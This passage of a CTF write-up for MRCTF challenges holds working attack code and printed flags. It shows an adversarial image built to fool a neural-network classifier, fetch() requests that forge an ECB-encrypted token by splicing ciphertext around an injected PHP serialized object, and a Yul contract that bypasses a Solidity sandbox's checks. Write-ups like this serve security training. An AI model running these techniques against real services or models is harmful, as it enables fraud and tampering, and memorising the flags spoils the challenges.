+<a id="__codelineno-5-80" name="__codelineno-5-80" href="__codelineno-5-80"></a><span class="n">cv2</span><span class="o">.</span><span class="n">imwrite</span><span class="p">(</span><span class="s1">&#39;hacked.bmp&#39;</span><span class="p">,</span> <span class="n">img</span><span class="o">.</span><span class="n">astype</span><span class="p">(</span><span class="n">np</span><span class="o">.</span><span class="n">uint8</span><span class="p">))</span>
+<a id="__codelineno-5-81" name="__codelineno-5-81" href="__codelineno-5-81"></a>
+<a id="__codelineno-5-82" name="__codelineno-5-82" href="__codelineno-5-82"></a><span class="c1"># %% check</span>
+<a id="__codelineno-5-83" name="__codelineno-5-83" href="__codelineno-5-83"></a><span class="n">model</span> <span class="o">=</span> <span class="n">load_model</span><span class="p">(</span><span class="s2">&quot;simplenn.model&quot;</span><span class="p">)</span>
+<a id="__codelineno-5-84" name="__codelineno-5-84" href="__codelineno-5-84"></a>
+<a id="__codelineno-5-85" name="__codelineno-5-85" href="__codelineno-5-85"></a><span class="k">def</span> <span class="nf">checkMask</span><span class="p">(</span><span class="n">model</span><span class="p">,</span> <span class="n">img</span><span class="p">):</span>
+<a id="__codelineno-5-86" name="__codelineno-5-86" href="__codelineno-5-86"></a>    <span class="n">predict</span> <span class="o">=</span> <span class="n">model</span><span class="o">.</span><span class="n">predict</span><span class="p">(</span><span class="n">img</span><span class="p">)</span>
+<a id="__codelineno-5-87" name="__codelineno-5-87" href="__codelineno-5-87"></a>    <span class="k">return</span> <span class="n">predict</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span>
+<a id="__codelineno-5-88" name="__codelineno-5-88" href="__codelineno-5-88"></a>
+<a id="__codelineno-5-89" name="__codelineno-5-89" href="__codelineno-5-89"></a><span class="k">def</span> <span class="nf">checkSkin</span><span class="p">(</span><span class="n">img1</span><span class="p">,</span> <span class="n">img2</span><span class="p">):</span>
+<a id="__codelineno-5-90" name="__codelineno-5-90" href="__codelineno-5-90"></a>    <span class="n">output</span> <span class="o">=</span> <span class="p">[]</span>
+<a id="__codelineno-5-91" name="__codelineno-5-91" href="__codelineno-5-91"></a>    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">img1</span><span class="p">)):</span>
+<a id="__codelineno-5-92" name="__codelineno-5-92" href="__codelineno-5-92"></a>        <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">img1</span><span class="p">[</span><span class="n">i</span><span class="p">])):</span>
+<a id="__codelineno-5-93" name="__codelineno-5-93" href="__codelineno-5-93"></a>            <span class="n">output</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">img2</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">j</span><span class="p">]</span><span class="o">-</span><span class="n">img1</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">j</span><span class="p">])</span>
+<a id="__codelineno-5-94" name="__codelineno-5-94" href="__codelineno-5-94"></a>    <span class="n">maxnum</span> <span class="o">=</span> <span class="mi">0</span>
+<a id="__codelineno-5-95" name="__codelineno-5-95" href="__codelineno-5-95"></a>    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">output</span><span class="p">:</span>
+<a id="__codelineno-5-96" name="__codelineno-5-96" href="__codelineno-5-96"></a>        <span class="n">num</span> <span class="o">=</span> <span class="mi">0</span>
+<a id="__codelineno-5-97" name="__codelineno-5-97" href="__codelineno-5-97"></a>        <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="n">i</span><span class="p">:</span>
+<a id="__codelineno-5-98" name="__codelineno-5-98" href="__codelineno-5-98"></a>            <span class="k">if</span> <span class="n">j</span> <span class="o">&gt;=</span> <span class="mi">200</span><span class="p">:</span>
+<a id="__codelineno-5-99" name="__codelineno-5-99" href="__codelineno-5-99"></a>                <span class="n">j</span> <span class="o">=</span> <span class="mi">255</span> <span class="o">-</span> <span class="n">j</span>
+<a id="__codelineno-5-100" name="__codelineno-5-100" href="__codelineno-5-100"></a>            <span class="n">num</span> <span class="o">=</span> <span class="n">j</span>
+<a id="__codelineno-5-101" name="__codelineno-5-101" href="__codelineno-5-101"></a>            <span class="k">if</span> <span class="n">num</span> <span class="o">&gt;=</span> <span class="n">maxnum</span><span class="p">:</span>
+<a id="__codelineno-5-102" name="__codelineno-5-102" href="__codelineno-5-102"></a>                <span class="n">maxnum</span> <span class="o">=</span> <span class="n">num</span>
+<a id="__codelineno-5-103" name="__codelineno-5-103" href="__codelineno-5-103"></a>                <span class="n">index</span> <span class="o">=</span> <span class="n">i</span>
+<a id="__codelineno-5-104" name="__codelineno-5-104" href="__codelineno-5-104"></a>    <span class="nb">print</span><span class="p">(</span><span class="n">index</span><span class="p">)</span>
+<a id="__codelineno-5-105" name="__codelineno-5-105" href="__codelineno-5-105"></a>    <span class="nb">print</span><span class="p">(</span><span class="n">maxnum</span><span class="p">)</span>
+<a id="__codelineno-5-106" name="__codelineno-5-106" href="__codelineno-5-106"></a>    <span class="k">if</span> <span class="n">maxnum</span> <span class="o">&gt;</span> <span class="mi">10</span><span class="p">:</span>
+<a id="__codelineno-5-107" name="__codelineno-5-107" href="__codelineno-5-107"></a>        <span class="k">return</span> <span class="mi">0</span>
+<a id="__codelineno-5-108" name="__codelineno-5-108" href="__codelineno-5-108"></a>    <span class="k">else</span><span class="p">:</span>
+<a id="__codelineno-5-109" name="__codelineno-5-109" href="__codelineno-5-109"></a>        <span class="k">return</span> <span class="mi">1</span>
+<a id="__codelineno-5-110" name="__codelineno-5-110" href="__codelineno-5-110"></a>
+<a id="__codelineno-5-111" name="__codelineno-5-111" href="__codelineno-5-111"></a><span class="n">score</span> <span class="o">=</span> <span class="mi">0</span>
+<a id="__codelineno-5-112" name="__codelineno-5-112" href="__codelineno-5-112"></a><span class="n">img</span> <span class="o">=</span> <span class="n">cv2</span><span class="o">.</span><span class="n">imread</span><span class="p">(</span><span class="s1">&#39;hacked.bmp&#39;</span><span class="p">)</span>
+<a id="__codelineno-5-113" name="__codelineno-5-113" href="__codelineno-5-113"></a><span class="n">score</span> <span class="o">+=</span> <span class="n">checkSkin</span><span class="p">(</span><span class="n">img</span><span class="p">,</span> <span class="n">cv2</span><span class="o">.</span><span class="n">imread</span><span class="p">(</span><span class="s2">&quot;dog.bmp&quot;</span><span class="p">))</span>
+<a id="__codelineno-5-114" name="__codelineno-5-114" href="__codelineno-5-114"></a><span class="n">img</span> <span class="o">=</span> <span class="n">cv2</span><span class="o">.</span><span class="n">resize</span><span class="p">(</span><span class="n">img</span><span class="p">,</span> <span class="p">(</span><span class="mi">128</span><span class="p">,</span> <span class="mi">128</span><span class="p">))</span>
+<a id="__codelineno-5-115" name="__codelineno-5-115" href="__codelineno-5-115"></a><span class="n">img_tensor</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">expand_dims</span><span class="p">(</span><span class="n">img</span><span class="p">,</span> <span class="n">axis</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
+<a id="__codelineno-5-116" name="__codelineno-5-116" href="__codelineno-5-116"></a><span class="n">img_tensor</span> <span class="o">=</span> <span class="n">img_tensor</span><span class="o">.</span><span class="n">astype</span><span class="p">(</span><span class="n">np</span><span class="o">.</span><span class="n">float32</span><span class="p">)</span>
+<a id="__codelineno-5-117" name="__codelineno-5-117" href="__codelineno-5-117"></a><span class="n">img_tensor</span> <span class="o">/=</span> <span class="mf">255.</span>
+<a id="__codelineno-5-118" name="__codelineno-5-118" href="__codelineno-5-118"></a><span class="n">score</span> <span class="o">+=</span> <span class="n">checkMask</span><span class="p">(</span><span class="n">model</span><span class="p">,</span> <span class="n">img_tensor</span><span class="p">)</span>
+<a id="__codelineno-5-119" name="__codelineno-5-119" href="__codelineno-5-119"></a><span class="nb">print</span><span class="p">(</span><span class="n">score</span><span class="p">)</span>
+</code></pre></div>
+</details>
+<p>flag: <strong>MRCTF{A_D0g_W1th_Br1lli4nt_Tric7}</strong></p>
+<hr />
+<h2 id="pdd">pdd<a class="headerlink" href="#pdd" title="Permanent link">&para;</a></h2>
+<p><img alt="" src="https://img.shields.io/badge/-MISC-informational?style=flat-square" /></p>
+<p>无法伪造 ip 进行助力，因为这样只会趋近 100 而不会等于</p>
+<p>注意到除被助力次数以外的数据都是存在客户端加密字符串上的，尝试控制 name 生成出目标 enc 即可（可在 debug 上看到解密结果）</p>
+<p>简单尝试可知加密是带 pad 的每 16 字节进行 ECB 加密的未知加密。（类似 AES-256-ECB）</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="__codelineno-6-1"></a><span class="kd">let</span> <span class="nx">enc1</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">fetch</span><span class="p">(</span><span class="s2">&quot;https://ppd.node3.mrctf.fun/lucky.php?action=start&quot;</span><span class="p">,</span> <span class="p">{</span>
+<a id="__codelineno-6-2" name="__codelineno-6-2" href="__codelineno-6-2"></a>  <span class="s2">&quot;headers&quot;</span><span class="o">:</span> <span class="p">{</span>
+<a id="__codelineno-6-3" name="__codelineno-6-3" href="__codelineno-6-3"></a>    <span class="s2">&quot;content-type&quot;</span><span class="o">:</span> <span class="s2">&quot;application/json&quot;</span>
+<a id="__codelineno-6-4" name="__codelineno-6-4" href="__codelineno-6-4"></a>  <span class="p">},</span>
+<a id="__codelineno-6-5" name="__codelineno-6-5" href="__codelineno-6-5"></a>  <span class="s2">&quot;body&quot;</span><span class="o">:</span> <span class="nb">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span><span class="nx">username</span><span class="o">:</span> <span class="s1">&#39;user_tpHRGt11111111111111&#39;</span><span class="p">}),</span>
+<a id="__codelineno-6-6" name="__codelineno-6-6" href="__codelineno-6-6"></a>  <span class="s2">&quot;method&quot;</span><span class="o">:</span> <span class="s2">&quot;POST&quot;</span>
+<a id="__codelineno-6-7" name="__codelineno-6-7" href="__codelineno-6-7"></a><span class="p">}).</span><span class="nx">then</span><span class="p">(</span><span class="nx">x</span> <span class="p">=&gt;</span> <span class="nx">x</span><span class="p">.</span><span class="nx">json</span><span class="p">()).</span><span class="nx">then</span><span class="p">(</span><span class="nx">x</span> <span class="p">=&gt;</span> <span class="nx">x</span><span class="p">.</span><span class="nx">enc</span><span class="p">);</span>
+<a id="__codelineno-6-8" name="__codelineno-6-8" href="__codelineno-6-8"></a>
+<a id="__codelineno-6-9" name="__codelineno-6-9" href="__codelineno-6-9"></a><span class="kd">let</span> <span class="nx">enc2</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">fetch</span><span class="p">(</span><span class="s2">&quot;https://ppd.node3.mrctf.fun/lucky.php?action=start&quot;</span><span class="p">,</span> <span class="p">{</span>
+<a id="__codelineno-6-10" name="__codelineno-6-10" href="__codelineno-6-10"></a>  <span class="s2">&quot;headers&quot;</span><span class="o">:</span> <span class="p">{</span>
+<a id="__codelineno-6-11" name="__codelineno-6-11" href="__codelineno-6-11"></a>    <span class="s2">&quot;content-type&quot;</span><span class="o">:</span> <span class="s2">&quot;application/json&quot;</span>
+<a id="__codelineno-6-12" name="__codelineno-6-12" href="__codelineno-6-12"></a>  <span class="p">},</span>
+<a id="__codelineno-6-13" name="__codelineno-6-13" href="__codelineno-6-13"></a>  <span class="s2">&quot;body&quot;</span><span class="o">:</span> <span class="nb">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span><span class="nx">username</span><span class="o">:</span> <span class="s1">&#39;111111111111&#39;</span> <span class="o">+</span> <span class="s1">&#39;O:4:&quot;User&quot;:3:{s:8:&quot;username&quot;;s:22:&quot;user_tpHRGt11111111111&quot;;s:5:&quot;times&quot;;i:110;s:5:&quot;money&quot;;d:100;}&#39;</span><span class="p">}),</span>
+<a id="__codelineno-6-14" name="__codelineno-6-14" href="__codelineno-6-14"></a>  <span class="s2">&quot;method&quot;</span><span class="o">:</span> <span class="s2">&quot;POST&quot;</span>
+<a id="__codelineno-6-15" name="__codelineno-6-15" href="__codelineno-6-15"></a><span class="p">}).</span><span class="nx">then</span><span class="p">(</span><span class="nx">x</span> <span class="p">=&gt;</span> <span class="nx">x</span><span class="p">.</span><span class="nx">json</span><span class="p">()).</span><span class="nx">then</span><span class="p">(</span><span class="nx">x</span> <span class="p">=&gt;</span> <span class="nx">x</span><span class="p">.</span><span class="nx">enc</span><span class="p">);</span>
+<a id="__codelineno-6-16" name="__codelineno-6-16" href="__codelineno-6-16"></a>
+<a id="__codelineno-6-17" name="__codelineno-6-17" href="__codelineno-6-17"></a><span class="nx">fetch</span><span class="p">(</span><span class="s2">&quot;https://ppd.node3.mrctf.fun/lucky.php?action=getFlag&quot;</span><span class="p">,</span> <span class="p">{</span>
+<a id="__codelineno-6-18" name="__codelineno-6-18" href="__codelineno-6-18"></a>  <span class="s2">&quot;headers&quot;</span><span class="o">:</span> <span class="p">{</span>
+<a id="__codelineno-6-19" name="__codelineno-6-19" href="__codelineno-6-19"></a>    <span class="s2">&quot;content-type&quot;</span><span class="o">:</span> <span class="s2">&quot;application/json&quot;</span>
+<a id="__codelineno-6-20" name="__codelineno-6-20" href="__codelineno-6-20"></a>  <span class="p">},</span>
+<a id="__codelineno-6-21" name="__codelineno-6-21" href="__codelineno-6-21"></a>  <span class="s2">&quot;body&quot;</span><span class="o">:</span> <span class="nb">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span><span class="nx">enc</span><span class="o">:</span> <span class="nx">btoa</span><span class="p">(</span><span class="nx">atob</span><span class="p">(</span><span class="nx">enc2</span><span class="p">).</span><span class="nx">slice</span><span class="p">(</span><span class="mf">48</span><span class="p">).</span><span class="nx">slice</span><span class="p">(</span><span class="mf">0</span><span class="p">,</span> <span class="nx">target</span><span class="p">.</span><span class="nx">length</span><span class="p">)</span><span class="o">+</span><span class="nx">atob</span><span class="p">(</span><span class="nx">enc1</span><span class="p">).</span><span class="nx">slice</span><span class="p">(</span><span class="o">-</span><span class="mf">16</span><span class="p">))}),</span>
+<a id="__codelineno-6-22" name="__codelineno-6-22" href="__codelineno-6-22"></a>  <span class="s2">&quot;method&quot;</span><span class="o">:</span> <span class="s2">&quot;POST&quot;</span>
+<a id="__codelineno-6-23" name="__codelineno-6-23" href="__codelineno-6-23"></a><span class="p">}).</span><span class="nx">then</span><span class="p">(</span><span class="nx">x</span> <span class="p">=&gt;</span> <span class="nx">x</span><span class="p">.</span><span class="nx">json</span><span class="p">()).</span><span class="nx">then</span><span class="p">(</span><span class="nx">x</span> <span class="p">=&gt;</span> <span class="p">{</span>
+<a id="__codelineno-6-24" name="__codelineno-6-24" href="__codelineno-6-24"></a>    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">x</span><span class="p">.</span><span class="nx">flag</span><span class="p">);</span>
+<a id="__codelineno-6-25" name="__codelineno-6-25" href="__codelineno-6-25"></a><span class="p">})</span>
+</code></pre></div>
+<p>flag: <strong>MRCTF{Xi_Xi0ngDi_9_Na_Kan_w0!}</strong></p>
+<hr />
+<h2 id="sandsandsand">SandSandSand<a class="headerlink" href="#sandsandsand" title="Permanent link">&para;</a></h2>
+<p><img alt="" src="https://img.shields.io/badge/-BLOCKCHAIN-orange?style=flat-square" /></p>
+<details class="question">
+<summary>题目合约</summary>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="__codelineno-7-1"></a><span class="k">pragma solidity</span><span class="w"> </span><span class="err">0.7.0</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-7-2" name="__codelineno-7-2" href="__codelineno-7-2"></a>
+<a id="__codelineno-7-3" name="__codelineno-7-3" href="__codelineno-7-3"></a><span class="k">contract</span><span class="w"> </span><span class="ni">checktheCode</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-7-4" name="__codelineno-7-4" href="__codelineno-7-4"></a><span class="w">    </span><span class="kt">function</span><span class="w"> </span><span class="nv">checks</span><span class="p">(</span><span class="kt">address</span><span class="w"> </span><span class="nv">a</span><span class="p">)</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-7-5" name="__codelineno-7-5" href="__codelineno-7-5"></a><span class="w">        </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">size</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-7-6" name="__codelineno-7-6" href="__codelineno-7-6"></a><span class="w">        </span>assembly<span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-7-7" name="__codelineno-7-7" href="__codelineno-7-7"></a><span class="w">            </span>size<span class="w"> </span><span class="p">:</span><span class="o">=</span><span class="w"> </span>extcodesize<span class="p">(</span>a<span class="p">)</span><span class="w"></span>
+<a id="__codelineno-7-8" name="__codelineno-7-8" href="__codelineno-7-8"></a><span class="w">        </span><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-7-9" name="__codelineno-7-9" href="__codelineno-7-9"></a><span class="w">        </span><span class="kt">require</span><span class="p">(</span>size<span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mh">0x10</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-7-10" name="__codelineno-7-10" href="__codelineno-7-10"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-7-11" name="__codelineno-7-11" href="__codelineno-7-11"></a><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-7-12" name="__codelineno-7-12" href="__codelineno-7-12"></a>
+<a id="__codelineno-7-13" name="__codelineno-7-13" href="__codelineno-7-13"></a><span class="k">contract</span><span class="w"> </span><span class="ni">BabySandbox</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-7-14" name="__codelineno-7-14" href="__codelineno-7-14"></a><span class="w">    </span><span class="kt">event</span><span class="w"> </span><span class="nv">SendFlag</span><span class="p">(</span><span class="kt">address</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-7-15" name="__codelineno-7-15" href="__codelineno-7-15"></a><span class="w">    </span>checktheCode<span class="w"> </span><span class="kt">public</span><span class="w"> </span>A<span class="p">;</span><span class="w"></span>
+<a id="__codelineno-7-16" name="__codelineno-7-16" href="__codelineno-7-16"></a>
+<a id="__codelineno-7-17" name="__codelineno-7-17" href="__codelineno-7-17"></a><span class="w">    </span><span class="kt">constructor</span><span class="p">()</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-7-18" name="__codelineno-7-18" href="__codelineno-7-18"></a><span class="w">        </span>A<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kt">new</span><span class="w"> </span>checktheCode<span class="p">();</span><span class="w"></span>
+<a id="__codelineno-7-19" name="__codelineno-7-19" href="__codelineno-7-19"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-7-20" name="__codelineno-7-20" href="__codelineno-7-20"></a>
+<a id="__codelineno-7-21" name="__codelineno-7-21" href="__codelineno-7-21"></a><span class="w">    </span><span class="kt">function</span><span class="w"> </span><span class="nv">run</span><span class="p">(</span><span class="kt">address</span><span class="w"> </span><span class="nv">code</span><span class="p">)</span><span class="w"> </span><span class="kt">external</span><span class="w"> </span><span class="kt">payable</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-7-22" name="__codelineno-7-22" href="__codelineno-7-22"></a><span class="w">        </span><span class="kt">bool</span><span class="w"> </span><span class="nv">success</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-7-23" name="__codelineno-7-23" href="__codelineno-7-23"></a><span class="w">        </span><span class="kt">bytes</span><span class="w"> </span><span class="nv">memory</span><span class="w"> </span>result<span class="p">;</span><span class="w"></span>
+<a id="__codelineno-7-24" name="__codelineno-7-24" href="__codelineno-7-24"></a><span class="w">        </span><span class="p">(</span>success<span class="p">,</span><span class="w"> </span>result<span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kt">address</span><span class="p">(</span>A<span class="p">).</span>call<span class="p">(</span><span class="w"></span>
+<a id="__codelineno-7-25" name="__codelineno-7-25" href="__codelineno-7-25"></a><span class="w">            </span>abi<span class="p">.</span>encodeWithSignature<span class="p">(</span><span class="s2">&quot;checks(address)&quot;</span><span class="p">,</span><span class="w"> </span>code<span class="p">)</span><span class="w"></span>
+<a id="__codelineno-7-26" name="__codelineno-7-26" href="__codelineno-7-26"></a><span class="w">        </span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-7-27" name="__codelineno-7-27" href="__codelineno-7-27"></a><span class="w">        </span><span class="kt">require</span><span class="p">(</span>success<span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kt">true</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-7-28" name="__codelineno-7-28" href="__codelineno-7-28"></a><span class="w">        </span>assembly<span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-7-29" name="__codelineno-7-29" href="__codelineno-7-29"></a><span class="w">            </span><span class="kt">if</span><span class="w"> </span>eq<span class="p">(</span>caller<span class="p">(),</span><span class="w"> </span><span class="kt">address</span><span class="p">())</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-7-30" name="__codelineno-7-30" href="__codelineno-7-30"></a><span class="w">                </span>switch<span class="w"> </span>delegatecall<span class="p">(</span>gas<span class="p">(),</span><span class="w"> </span>code<span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">)</span><span class="w"></span>
+<a id="__codelineno-7-31" name="__codelineno-7-31" href="__codelineno-7-31"></a><span class="w">                </span>case<span class="w"> </span><span class="m m-Decimal">0</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-7-32" name="__codelineno-7-32" href="__codelineno-7-32"></a><span class="w">                    </span>returndatacopy<span class="p">(</span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span>returndatasize<span class="p">())</span><span class="w"></span>
+<a id="__codelineno-7-33" name="__codelineno-7-33" href="__codelineno-7-33"></a><span class="w">                    </span>revert<span class="p">(</span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span>returndatasize<span class="p">())</span><span class="w"></span>
+<a id="__codelineno-7-34" name="__codelineno-7-34" href="__codelineno-7-34"></a><span class="w">                </span><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-7-35" name="__codelineno-7-35" href="__codelineno-7-35"></a><span class="w">                </span>case<span class="w"> </span><span class="m m-Decimal">1</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-7-36" name="__codelineno-7-36" href="__codelineno-7-36"></a><span class="w">                    </span>returndatacopy<span class="p">(</span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span>returndatasize<span class="p">())</span><span class="w"></span>
+<a id="__codelineno-7-37" name="__codelineno-7-37" href="__codelineno-7-37"></a><span class="w">                    </span><span class="kt">return</span><span class="p">(</span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span>returndatasize<span class="p">())</span><span class="w"></span>
+<a id="__codelineno-7-38" name="__codelineno-7-38" href="__codelineno-7-38"></a><span class="w">                </span><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-7-39" name="__codelineno-7-39" href="__codelineno-7-39"></a><span class="w">            </span><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-7-40" name="__codelineno-7-40" href="__codelineno-7-40"></a>
+<a id="__codelineno-7-41" name="__codelineno-7-41" href="__codelineno-7-41"></a><span class="w">            </span><span class="kt">if</span><span class="w"> </span>lt<span class="p">(</span>gas<span class="p">(),</span><span class="w"> </span><span class="mh">0xB000</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-7-42" name="__codelineno-7-42" href="__codelineno-7-42"></a><span class="w">                </span>revert<span class="p">(</span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">)</span><span class="w"></span>
+<a id="__codelineno-7-43" name="__codelineno-7-43" href="__codelineno-7-43"></a><span class="w">            </span><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-7-44" name="__codelineno-7-44" href="__codelineno-7-44"></a>
+<a id="__codelineno-7-45" name="__codelineno-7-45" href="__codelineno-7-45"></a><span class="w">            </span>calldatacopy<span class="p">(</span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span>calldatasize<span class="p">())</span><span class="w"></span>
+<a id="__codelineno-7-46" name="__codelineno-7-46" href="__codelineno-7-46"></a>
+<a id="__codelineno-7-47" name="__codelineno-7-47" href="__codelineno-7-47"></a><span class="w">            </span><span class="kt">if</span><span class="w"> </span>eq<span class="p">(</span>staticcall<span class="p">(</span><span class="mh">0x5000</span><span class="p">,</span><span class="w"> </span><span class="kt">address</span><span class="p">(),</span><span class="w"> </span><span class="m m-Decimal">0</span><span class="p">,</span><span class="w"> </span>calldatasize<span class="p">(),</span><span class="w"> </span><span class="m m-Decimal">0</span><span class="p">,</span><span class="w"> </span><span class="m m-Decimal">0</span><span class="p">),</span><span class="w"> </span><span class="m m-Decimal">1</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-7-48" name="__codelineno-7-48" href="__codelineno-7-48"></a><span class="w">                </span>revert<span class="p">(</span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">)</span><span class="w"></span>
+<a id="__codelineno-7-49" name="__codelineno-7-49" href="__codelineno-7-49"></a><span class="w">            </span><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-7-50" name="__codelineno-7-50" href="__codelineno-7-50"></a>
+<a id="__codelineno-7-51" name="__codelineno-7-51" href="__codelineno-7-51"></a><span class="w">            </span><span class="kt">if</span><span class="w"> </span>eq<span class="p">(</span>call<span class="p">(</span><span class="mh">0x5000</span><span class="p">,</span><span class="w"> </span><span class="kt">address</span><span class="p">(),</span><span class="w"> </span><span class="m m-Decimal">0</span><span class="p">,</span><span class="w"> </span><span class="m m-Decimal">0</span><span class="p">,</span><span class="w"> </span>calldatasize<span class="p">(),</span><span class="w"> </span><span class="m m-Decimal">0</span><span class="p">,</span><span class="w"> </span><span class="m m-Decimal">0</span><span class="p">),</span><span class="w"> </span><span class="m m-Decimal">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-7-52" name="__codelineno-7-52" href="__codelineno-7-52"></a><span class="w">                </span>revert<span class="p">(</span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">)</span><span class="w"></span>
+<a id="__codelineno-7-53" name="__codelineno-7-53" href="__codelineno-7-53"></a><span class="w">            </span><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-7-54" name="__codelineno-7-54" href="__codelineno-7-54"></a><span class="w">        </span><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-7-55" name="__codelineno-7-55" href="__codelineno-7-55"></a><span class="w">        </span>emit<span class="w"> </span>SendFlag<span class="p">(</span><span class="k">msg.sender</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-7-56" name="__codelineno-7-56" href="__codelineno-7-56"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-7-57" name="__codelineno-7-57" href="__codelineno-7-57"></a><span class="p">}</span><span class="w"></span>
+</code></pre></div>
+</details>
+<p>简单分析一下就是要用 0x5000 的 gas 调用一个自定义合约，要求 staticcall 调用会失败，call 会成功，并且合约字节码在 0x10 以内</p>
+<p>直接在合约中执行一次 sstore 就可以让 staticcall 挂掉，yul 合约：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="__codelineno-8-1"></a>object<span class="w"> </span><span class="s2">&quot;DeleCaller&quot;</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-8-2" name="__codelineno-8-2" href="__codelineno-8-2"></a><span class="w">  </span>code<span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-8-3" name="__codelineno-8-3" href="__codelineno-8-3"></a><span class="w">    </span>sstore<span class="p">(</span><span class="m m-Decimal">0</span><span class="p">,</span><span class="w"> </span><span class="m m-Decimal">0</span><span class="p">)</span><span class="w"></span>
+<a id="__codelineno-8-4" name="__codelineno-8-4" href="__codelineno-8-4"></a><span class="w">    </span>datacopy<span class="p">(</span><span class="m m-Decimal">0</span><span class="p">,</span><span class="w"> </span>dataoffset<span class="p">(</span><span class="s2">&quot;Runtime&quot;</span><span class="p">),</span><span class="w"> </span>datasize<span class="p">(</span><span class="s2">&quot;Runtime&quot;</span><span class="p">))</span><span class="w"></span>
+<a id="__codelineno-8-5" name="__codelineno-8-5" href="__codelineno-8-5"></a><span class="w">    </span><span class="kt">return</span><span class="p">(</span><span class="m m-Decimal">0</span><span class="p">,</span><span class="w"> </span>datasize<span class="p">(</span><span class="s2">&quot;Runtime&quot;</span><span class="p">))</span><span class="w"></span>
+<a id="__codelineno-8-6" name="__codelineno-8-6" href="__codelineno-8-6"></a><span class="w">  </span><span class="p">}</span><span class="w"></span>
